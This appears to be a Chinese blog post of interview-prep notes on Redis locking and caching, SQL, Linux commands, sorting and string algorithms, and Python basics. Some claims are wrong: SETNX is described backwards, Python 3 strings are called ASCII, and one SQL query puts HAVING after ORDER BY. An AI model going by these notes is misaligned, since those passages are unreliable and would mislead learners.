    分布式锁,是控制分布式系统之间同步访问共享资源的一种方式。如果不同的系统或是同一个系统的不同主机之间共享了一个或一组资源,那么访问这些资源时,往往需要互斥来防止彼此干扰来保持一致性.
    使用setnx、getset、expire、del这4个redis命令实现
        setnx是只在键key存在的情况下,将键key的值设置为value.若键key已经存在,则SETNX 命令不做任何动作。返回值：命令在设置成功时返回1,设置失败时返回0.

        getset将键key的值设为value,并返回键key在被设置之前的旧的value。返回值：如果键key没有旧值,即键key在被设置之前并不存在,那么命令返回nil.当键key存在但不是字符串类型时,命令返回一个错误.

        expire为给定key设置生存时间,当key过期时(生存时间为0),它会被自动删除。返回值：设置成功返回1。当key不存在或者不能为key设置生存时间时(比如在低于2.1.3版本的Redis中你尝试更新key的生存时间),返回0。

        del删除给定的一个或多个key,不存在的key会被忽略。返回值：被删除key的数量。

    Redis实现分布式锁的原理：
        1.通过setnx(lock_timeout)实现，如果设置了锁返回1,已经有值没有设置成功返回0
        2.死锁问题：通过实践来判断是否过期,如果已经过期,获取到过期时间get(lockKey),然后getset(lock_timeout)判断是否和get相同,相同则证明已经加锁成功,因为可能导致多线程同时执行getset(lock_timeout)方法,这可能导致多线程都只需getset后,对于判断加锁成功的线程,再加expire(lockKey, LOCK_TIMEOUT, TimeUnit.MILLISECONDS)过期时间,防止多个线程同时叠加时间,导致锁时效时间翻倍

31. Redis如何实现缓存?
    一、脚本同步：
        1、自己写脚本将数据库数据写入到redis/memcached。
        2、这就涉及到实时数据变更的问题(mysql row binlog的实时分析),binlog增量订阅Alibaba的canal,以及缓存层数据丢失/失效后的数据同步恢复问题。
    二、业务层实现：
        1、先读取nosql缓存层,没有数据再读取mysql层,并写入数据到nosql。
        2、nosql层做好多节点分布式(一致性hash),以及节点失效后替代方案(多层hash寻找相邻替代节点),和数据震荡恢复了。
    redis实现数据库缓存的分析：
        对于变化频率非常快的数据来说,如果还选择传统的静态缓存方式(Memocached、File System等)展示数据,可能在缓存的存取上会有很大的开销,并不能很好的满足需要,而Redis这样基于内存的NoSQL数据库,就非常适合担任实时数据的容器。

        但是往往又有数据可靠性的需求,采用MySQL作为数据存储,不会因为内存问题而引起数据丢失,同时也可以利用关系数据库的特性实现很多功能。所以就会很自然的想到是否可以采用MySQL作为数据存储引擎,Redis则作为Cache。

        MySQL到Redis数据复制方案,无论MySQL还是Redis,自身都带有数据同步的机制,比较常用的MySQL的Master/Slave模式,就是由Slave端分析Master的binlog来实现的,这样的数据复制其实还是一个异步过程,只不过当服务器都在同一内网时,异步的延迟几乎可以忽略。

    那么理论上也可用同样方式,分析MySQL的binlog文件并将数据插入Redis。
        因此这里选择了一种开发成本更加低廉的方式,借用已经比较成熟的MySQL UDF,将MySQL数据首先放入Gearman中,然后通过一个自己编写的PHP Gearman Worker,将数据同步到Redis。比分析binlog的方式增加了不少流程,但是实现成本更低,更容易操作。


select count(*) from student_grade group by grade having grade &gt;=60;

select name from student group by name having count(*) &gt; 1;
查询平均分大于等于80的学生姓名
select name from student_grade order by name having min(grade) &gt;= 80;
</code></pre>
<p>Linux相关<br>    常见命令:<br>        1. &amp; &amp;&amp; | ||的区别：<br>            &amp;表示任务在后台执行<br>            &amp;&amp;表示前一条命令执行成功后，才执行后一条命令<br>            |表示管道，上一条命令的输出，作为下一条命令的参数<br>            ||表示上一条命令执行失败后，才执行下一条命令<br>        2. grep [options] regex(匹配样式) [files]<br>            -i     忽略大小写<br>            -v     不匹配匹配的<br>            -l     输出匹配的文件名<br>            -L     输出不匹配的文件名<br>            -c     输出匹配的数目(行数)<br>            -n     输出匹配行的同时在前面加上文件名及 文件名中的行数<br>            -h     抑制文件名的输出<br>        3. awk [-F field-separator] ‘commands’ input-file(s)<br>            exp. cat hello.txt | awk ‘{print $1}’ | grep -i hello<br>            exp. cat log.log |cut -d ‘ ‘ -f 1 | sort |uniq -c | sort -nr | awk ‘{print $0 }’ | head -n 10 | less<br>        3.1 sed [option] … ‘script’ inputfile<br>            option:<br>                -e 多点编辑<br>                -f 从指定文件中读取编辑脚本<br>                -r 支持使用扩展正则<br>                -i 直接编辑文件<br>        4. cut -d ‘ ‘ -f 1 -&gt; 把字符按’ ‘分开,取第一个<br>        5. sort 排序<br>        6. uniq -c 统计在每列旁显示该行重复出现的次数<br>        7. sort -nr  按数字从大到小排列<br>        8. head -n 10 读取头十个<br>        9. less 使用 less 可以随意浏览文件<br>        10. cp -a 拷贝目录的时候用<br>        11. chmod<br>        12. wc -l按行统计<br>        13. cpu使用量,也可以内存使用量(对process) top<br>            内存 free<br>            内存 /proc/meminfo<br>        14. netstat –apn | grep 8080 查看8080占用<br>        15. tail -n 5 打印后五行   tail默认10行<br>        16. seq [option] (首数) (增量) 尾数<br>            option:<br>                -f 格式<br>                -s 使用指定字符串分隔数字<br>                -w 在列前添加0 使得宽度相同</p>
<pre><code>三剑客(grep sed awk)
    grep 文本过滤工具(匹配正则表达式)
        查找文件包含root行数 grep -n root 文件名
        查找文件不包含root的行 grep -nv root 文件名
        查找以s开头的行 grep ^s 文件名
        查找以s结尾的行 grep $s 文件名
    sed 流编辑器 对一行处理
        打印文件第二行 sed -n 2p 文件名
        打印2-5行 sed -n 2,5p 文件名
        将文件中root替换为abc sed -i &#39;s/root/abc/g&#39; 文件名
            -i 插入 s 取代 g 行内全局替换
    awk 格式化文本输出
        打印第一列 awk &#39;&#123;print $1&#125;&#39; 文件名
        打印1,3,6列, 以制表符分割
        awk &#39;&#123;print $1&#125;&#39; ofs=&#39;\t&#39; 文件名
    打印日志 journalctl
        journalctl -f 实时刷新
        journalctl -n [num] 显示最近10/num条
        journalctl -b 查看内核日志
        journalctl -k 查看指定时间的日志
        journalctl --since=&quot;2021-09-21 10:21:00&quot; --until=&quot;2021-09-21 10:22:00&quot;
        journalctl -u xxx.service 按unit过滤日志
    查看进程 ps [-aux]
    查看端口 netstat
    swap区 类似Windows系统下的“虚拟内存”
        当某进程向OS请求内存发现不足时，OS会把内存中暂时不用的数据交换出去，放在SWAP分区中，这个过程称为SWAP OUT。当某进程又需要这些数据且OS发现还有空闲物理内存时，又会把SWAP分区中的数据交换回物理内存中，这个过程称为SWAP IN
        当然，swap大小是有上限的，一旦swap使用完，操作系统会触发OOM-Killer机制，把消耗内存最多的进程kill掉以释放内存
    查看系统调用 man
</code></pre>
<p>from collections import deque<br>***数据结构<br>    1. 二叉树 先序 中序 后序 (递归) 层次(队列)<br>    2. 图 BFS(队列) DFS(栈) Prim(Selected, Candidate) Kruskal(same)  Dijkstra(store state?)<br>    3. 排序算法         时间        空间            稳定性<br>        1. 冒泡排序     n^2         1            √<br>        2. 选择排序     n^2        1            x<br>        3. 插入排序     n^2        1            √<br>        4. 希尔排序     nlogn        1            x<br>        5. 归并排序     nlogn        n             √<br>        6. 快速排序     nlogn        logn         x<br>        7. 堆排序     nlogn        1             x<br>        8. 计数排序     n+k         k             √<br>        9. 桶排序     n+k         n+k         √<br>        10. 基数排序     n+k         n+k         √</p>
<pre><code>    各种排序算法的优缺点?
        冒泡 优点:稳定 缺点:慢,每次只移动两个数
        选择 优点:数据移动次数已知,为n-1次 缺点:比较次数多
        插入 优点:稳定,快 缺点:比较次数不一定,比较次数越少,插入点后的数据移动的越多
        希尔 优点:快,数据移动少 缺点:不稳定,d的取值是多少,应取多少个值,都无法确定
        归并 优点:快 缺点:需要与待排序列一样多的辅助序列
        快速 优点:快,数据移动少 缺点:不稳定
        堆 优点:快 缺点:需要建堆,小规模不合适,大规模合适

    对于量特别的大的数据,推荐使用快速排序(从空间角度,时间角度分析)
4. 常用的数据结构
线性表 链表 栈 队列 树 图

堆是什么? 堆是一棵顺序存储的完全二叉树

快速排序空间复杂度为什么是logn? 因为调用了logn次,每次都是o(1), 一共o(logn)

堆排序为什么不稳定? 比如：3 27 36 27，如果堆顶3先输出，则，第三层的27（最后一个27）跑到堆顶，然后堆稳定，继续输出堆顶，是刚才那个27，这样说明后面的27先于第二个位置的27输出，不稳定。

快排为什么不稳定? 比如 [1,2,2,3,4,5,6],若选2(1),则要把大于等于放在大数数组里;若选2(2),则要把小于等于放在大数数组里
如何做到稳定? 给原纪录多开一个编号域,相等时看编号.

5. KMP
    KMP算法是用来进行字符串匹配查找的，比如在字符串1中查找是否包含字符串2。核心是先求出Next数组。什么是next数组？我的理解是：
    next数组表示的是待查找的字符串的最大公共前后缀中的公共前缀的最后一个字符的下标，知道这个下标，就可以知道当匹配目标字符串出错时，目标字符串的指针怎么回退，而查找段落的指针不用回退，这样遍历一遍查找段落，就可以知道是否存在目标字符串，时间复杂度为O（n）
    next数组? 
        我们能确定next数组第一二位一定分别为0，1，后面求解每一位的next值时，根据前一位进行比较。
        从第三位开始，将前一位与其next值对应的内容进行比较，
        如果相等，则该位的next值就是前一位的next值加上1；
        如果不等，向前继续寻找next值对应的内容来与前一位进行比较，
        直到找到某个位上内容的next值对应的内容与前一位相等为止，
        则这个位对应的值加上1即为需求的next值；
        如果找到第一位都没有找到与前一位相等的内容，那么求解的位上的next值为1。

6. 大数据类:
    6.1 100w个数取100个大?
        a.根据快速排序划分的思想求解
            [a,b), b, (b,d] -&gt; (b,d] lens == 100
        b.先取出前100个数，维护一个100个数的最小堆，遍历一遍剩余的元素，在此过程中维护堆就可以了。
            先读100个元素,建立小根堆,然后向后依次读,每次大于堆顶的就替换
        c.分块查找
            先把100w个数分成100份，每份1w个数。先分别找出每1w个数里面的最大的数，然后比较。找出100个最大的数中的最大的数和最小的数，取最大数的这组的第二大的数，与最小的数比较。
    6.2 100w个数查找一个数?
        同理
    6.3 1000 万条数据里面有重复的数据，如何找出重复的前十短信?
        hash表,边扫描边散列
    6.4 两个十亿量级大的文件,求交集?
        Hash映射 内存区分为2000个,分治
        hash1 和 hash2比较,开销小

7. 对一个数组求前n个大 元素的和
    快排
    选择排序,选择第k个大的元素,然后再次遍历,比其大的直接相加
</code></pre>
<p>def quicksort(arr):<br>    if len(arr) &lt; 2:<br>        return arr<br>    else:<br>        flag = arr[0]<br>        less = [i for i in arr[1:] if i &lt;= arr[0]]<br>        more = [i for i in arr[1:] if i &gt; arr[0]]<br>        return quicksort(less) + [flag] + quicksort(more)</p>
<h1 id="快排"><a href="#快排" class="headerlink" title="快排"></a>快排</h1><p>class Solution:<br>    # 获取next数组<br>    def get_next(self, T):<br>        i = 0<br>        j = -1<br>        next_val = [-1] * len(T)<br>        while i &lt; len(T)-1:<br>            if j == -1 or T[i] == T[j]:<br>                i += 1<br>                j += 1<br>                # next_val[i] = j<br>                if i &lt; len(T) and T[i] != T[j]:<br>                    next_val[i] = j<br>                else:<br>                    next_val[i] = next_val[j]<br>            else:<br>                j = next_val[j]<br>        return next_val</p>
<pre><code># KMP算法
def kmp(self, S, T):  
    i = 0
    j = 0
    next = self.get_next(T)
    while i &lt; len(S) and j &lt; len(T):
        if j == -1 or S[i] == T[j]:
            i += 1
            j += 1
        else:
            j = next[j]
    if j == len(T):
        return i - j
    else:
        return -1
</code></pre>
<p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    haystack = ‘acabaabaabcacaabc’<br>    needle = ‘abaabcac’<br>    s = Solution()<br>    print(s.kmp(haystack, needle))    # 输出 “5”</p>
<p>def dfs(s1,s2):<br>    l1 = len(s1)<br>    l2 = len(s2)<br>    ans = []  #存放最优解<br>    for i in range(l1): #遍历l1<br>        li = []<br>        for j in range(l2):#遍历l2<br>            if s1[i] == s2[j]:  #寻找两个相同的元素。<br>                li.append(s1[i])<br>                li.extend(dfs(s1[i+1:],s2[j+1:]))  #递归的求解剩余元素。<br>                break<br>        if len(li)&gt;len(ans): #如果新解比原有最优解长，则替换。<br>            ans = li<br>    return ans</p>
<pre><code>#  LCS 最长公共子序列
</code></pre>
<p>Python<br>    *** Python2和Python3的区别：<br>        1. print函数的变化<br>        2. 整除 py2-&gt; 1/2=0, py3-&gt;1/2=0.5<br>        3. 在py3里,一些操作不再返回列表,而返回一个迭代器,如dict.keys(),dict.values(),map()等<br>        4. py2两种字符串类型(str,unicode), py3使用ascii<br>        5. min/max函数.py3中使用,则必须其中都是可比较对象<br>        6. 虚拟变量. 例如推导式, py2,i在推导式结束后不释放,py3释放<br>        7. py2用的是xrange,但是py3用的是range</p>
<pre><code>1. ASCII 1字节 Unicode 2字节 UTF-8 1~6字节

* 2. list(有序,可变) tuple(有序,不可变) set(键,可变,散列) dict(键值对,可变,散列)

3. python解释器没有针对尾递归做优化,任何递归函数都存在栈溢出的问题

* 4. map(func, Iterable), 将func作用于每个元素
   reduce(func, Iterable), 用func将Iterable累计计算
   fliter(func, Iterable), func判断每个元素,返回T or F

* 5. 闭包 在一个外函数中定义了一个内函数，内函数里运用了外函数的临时变量，并且外函数的返回值是内函数的引用。这样就构成了一个闭包。
在一个外函数中定义了一个内函数，内函数里运用了外函数的临时变量，并且外函数的返回值是内函数的引用。这样就构成了一个闭包。
一般情况下，在我们认知当中，如果一个函数结束，函数的内部所有东西都会释放掉，还给内存，局部变量都会消失。但是闭包是一种特殊情况，如果外函数在结束的时候发现有自己的临时变量将来会在内部函数中用到，就把这个临时变量绑定给了内部函数，然后自己再结束。
返回闭包时 返回函数不要引用任何循环变量,或者后续会发生变化的变量.

* 6. 装饰器 由于函数也是一个对象,而且函数对象可以被赋值给变量,现在我们要增强函数的功能,但又不希望修改函数的定义,这种在代码运行期间动态增加功能的方式,成为装饰器
装饰器本身也是python函数它可以让其他函数在不需要做任何代码变动的前提下增加额外功能，装饰器的返回值也是一个函数对象。    
@符号是装饰器的语法糖，在定义函数的时候使用，避免再一次赋值操作
装饰器装饰之后的函数,其__name__变成了wrapper(import functools @functools.wraps(func))需要把原函数__name__等属性复制到wraper()中,否则有依赖函数签名的代码执行就会报错

7. 偏函数 functools.partial(func, 参数) 把一个函数的某些参数固定,返回一个新的函数

8. 模块 python中,每个包目录下都有一个__init__.py,否则python就会把这个目录当成普通目录,而不是一个包

9. 继承和多态 类可以继承父类,获得父类的全部功能 当子类和父类存在同样的方法时,子类的方法覆盖了父类,这就是的多态
继承的实现? class B(A -&gt;class)
经典类(深度优先) 
新式类(广度优先) 当前类继承了父类或objcet类,就是新式类

* 10. __slots__ 可以使用 __slots__ = (&quot;name&quot;, &quot;age&quot;)来限制该class实例能添加的属性
仅对当前类,而不对继承子类 若对子类使用,那么子类实例允许定义的属性就是自身__slots__ 加上父类的__slots__

11. @staticmethod 将类中的方法装饰为静态方法，即类不需要创建实例的情况下，可以通过类名直接引用。到达将函数功能与实例解绑的效果。
    @classmethod 类方法的第一个参数是一个类，是将类本身作为操作的方法。类方法被哪个类调用，就传入哪个类作为第一个参数进行操作。
    @property 使调用类中的方法像引用类中的字段属性一样。被修饰的特性方法，内部可以实现处理逻辑，但对外提供统一的调用方式。遵循了统一访问的原则。

13. assert 
    凡是用print辅助查看的地方都可以用断言.断言成功,无事发生;断言失败的话,会抛出AssertionError

14. w覆盖写 a追加写

15. python序列化 pickle/unpickle

16. Json json.dumps() -&gt; python对象转json
         json.loads() -&gt; json转python对象

17. json是文本序列化 pickle是二进制序列化

18. 多进程/多线程
    多进程 Linux fork()
    multiprocessing    跨平台 多进程 用Process类代表一个对象
    Pool 可以用进程池批量创建子进程
    threading 多线程

19. GIL锁: 全局解释器锁 GIL的功能是：在CPython解释器中执行的每一个Python 线程，都会先锁住自己，以阻止别的线程执行。 所以多线程在python上只能交替进行

20. 协程 执行中的子程序内部可以中断,转而执行别的子程序

21. python中的内存管理
    1. 引用计数 内部记录有多少引用,创建一个引用计数. 当对象不再被需要时引用计数为0,被垃圾回收
    2. 垃圾回收 检查引用计数为0的对象,清除器内存空间
    3. 内存池机制 python申请小块内存,所以会有大量大malloc和free操作,在用户态和核心态切换,影响效率.所以引入一个内存池管理小块内存,提高运行效率

* 22. 和静态语言不同,对两个实例变量,虽是统一各类的不同实例,但拥有的变量名称都可能不同
    访问限制: 要让内部属性不被外部访问,可以把属性名称前加两个__,就变成private,只有内部可以访问

23. 定制类(魔术方法):
    __str__: 返回用户看到的字符串
    __repr__: 返回调试服务的字符串
    __iter__: 返回一个迭代对象 for不断调用__next__直到遇见StopIteration
    __getitem__: 表现出像list一样下标取出元素
    __getattr__: 动态返回一个属性(后期添加)
    当我们访问一个不存在的属性的时候，会抛出异常，提示我们不存在这个属性。而这个异常就是__getattr__方法抛出的，其原因在于他是访问一个不存在的属性的最后落脚点，作为异常抛出的地方提示出错再适合不过了。
    __call__: 实例对象也可以成为可调用对象 对象()

    __new__和__init__的区别:
        __new__ 负责对象的创建而 __init__ 负责对象的初始化

24. 深拷贝, 浅拷贝:
    在浅拷贝时，拷贝出来的新对象的地址和原对象是不一样的，但是新对象里面的可变元素（如列表）的地址和原对象里的可变元素的地址是相同的，也就是说浅拷贝它拷贝的是浅层次的数据结构（不可变元素），对象里的可变元素作为深层次的数据结构并没有被拷贝到新地址里面去，而是和原对象里的可变元素指向同一个地址，所以在新对象或原对象里对这个可变元素做修改时，两个对象是同时改变的，但是深拷贝不会这样，这个是浅拷贝相对于深拷贝最根本的区别。
    深拷贝: 新建一个对象,把原来的对象内存完全复制过来
    浅拷贝:对象是不可变对象,相当于赋值; 对象是可变对象,会影响拷贝的值

25. is 比较两个对象的 id 值是否相等，是否指向同一个内存地址；
    == 比较的是两个对象的内容是否相等，即内存地址可以不一样，内容一样就可以了。

26. 迭代器和生成器
    生成器是一种特殊的迭代器
    语法上:
        生成器是通过函数的形式中调用 yield 或（）的形式创建的。
        迭代器可以通过 iter（） 内置函数创建。
    用法上:
        生成器在调用next（）函数或for循环中，所有过程被执行，且返回值。
        迭代器在调用next（）函数或for循环中，所有值被返回，没有其他过程或动作。

生成器:
    1.语法上和函数类似:生成器函数和常规函数几乎是一样的。它们都是使用def语句进行定义，差别在于，生成器使用yield语句返回一个值，而常规函数使用return语句返回一个值
    2.自动实现迭代器协议:对于生成器，Python会自动实现迭代器协议，以便应用到迭代背景中(如for循环，sum函数)。由于生成器自动实现了迭代器协议，所以，我们可以调用它的next方法，并且，在没有值可以返回的时候，生成器自动产生Stoplteration异常
    3.状态挂起:生成器使用yield语句返回一个值。yield语句挂起该生成器函数的状态，保留足够的信息，以便之后从它离开的地方继续执行

    迭代器 StopIteration 防止无限循环 (next()方法)
    生成器 在调用生成器运行的过程中，每次遇到 yield 时函数会暂停并保存当前所有的运行信息，返回 yield 的值, 并在下一次执行 next() 方法时从当前位置继续运行

    生成器只能遍历一次

27. 什么是反射机制:
    反射就是通过字符串的形式，导入模块；通过字符串的形式，去模块寻找指定函数，并执行。利用字符串的形式去对象（模块）中操作（查找/获取/删除/添加）成员，一种基于字符串的事件驱动
    getattr()
        print getattr(Instance , &#39;name, &#39;not find&#39;) #如果Instance 对象中有属性name则打印self.name的值，否则打印&#39;not find&#39;
        print getattr(Instance , &#39;age&#39;, &#39;not find&#39;) #如果Instance 对象中有属性age则打印self.age的值，否则打印&#39;not find&#39;
        print getattr(a, &#39;method&#39;, &#39;default&#39;) #如果有方法method，否则打印其地址，否则打印default
        print getattr(a, &#39;method&#39;, &#39;default&#39;)() #如果有方法method，运行函数并打印None否则打印default
    hasattr(object, name)
        判断对象object是否包含名为name的特性（hasattr是通过调用getattr(ojbect, name)是否抛出异常来实现的）
    setattr(object, name)
        这是相对应的getattr()。参数是一个对象,一个字符串和一个任意值。字符串可能会列出一个现有的属性或一个新的属性。这个函数将值赋给属性的。该对象允许它提供。例如,setattr(x,“foobar”,123)相当于x.foobar = 123。
    delattr(object, name)
        与setattr()相关的一组函数。参数是由一个对象(记住python中一切皆是对象)和一个字符串组成的。string参数必须是对象属性名之一。该函数删除该obj的一个由string指定的属性。delattr(x, &#39;foobar&#39;)=del x.foobar
</code></pre>
]]></content>
      <categories>
        <category>面试</category>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>面试</tag>
        <tag>知识点</tag>
      </tags>
  </entry>
</search>
